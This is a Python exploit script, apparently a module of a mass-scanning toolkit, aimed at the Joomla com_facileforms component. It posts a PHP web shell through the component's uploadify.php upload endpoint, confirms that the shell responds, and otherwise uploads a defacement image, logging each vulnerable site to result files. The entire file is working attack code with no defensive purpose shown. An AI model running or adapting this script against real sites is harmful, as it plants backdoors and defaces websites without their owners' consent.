# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
ShellPresta = 'files/up.php'
Jce_Deface_image = 'files/pwn.gif'


def Exploit(site):
    try:
        Check = requests.get('http://' + site + '/components/com_facileforms/libraries/jquery/uploadify.php',
                             timeout=10, headers=Headers)
        if Check.status_code == 200 or Check.status_code == 500:
            IndeX = {'Filedata': open(Jce_Deface_image, 'rb')}
            ShellFile = {'Filedata': open(ShellPresta, 'rb')}
            Datapost = {'folder': '/components/com_facileforms/libraries/jquery/'}
            requests.post('http://' + site + '/components/com_facileforms/libraries/jquery/uploadify.php',
                          files=ShellFile, data=Datapost, timeout=10, headers=Headers)
            CheckShell = requests.get('http://' + site +
                                      '/components/com_facileforms/libraries/jquery/up.php',
                                      timeout=10, headers=Headers)
            if 'Vuln!!' in str(CheckShell.content):
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/components/com_facileforms/libraries/jquery/up.php\n')
                return printModule.returnYes(site, 'N/A', 'Com_facileforms', 'Joomla')
            else:
                requests.post('http://' + site + '/components/com_facileforms/libraries/jquery/uploadify.php',
                              files=IndeX, data=Datapost, timeout=10, headers=Headers)

                CheckIndex = requests.get('http://' + site + '/components/com_facileforms/libraries/jquery/'
                                          + Jce_Deface_image.split('/')[1], headers=Headers, timeout=10)
                if 'GIF89a' in str(CheckIndex.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/components/com_facileforms/libraries/jquery/'
                                     + Jce_Deface_image.split('/')[1] + '\n')
                    return printModule.returnYes(site, 'N/A', 'Com_facileforms', 'Joomla')
                else:
                    return printModule.returnNo(site, 'N/A', 'Com_facileforms', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_facileforms', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_facileforms', 'Joomla')
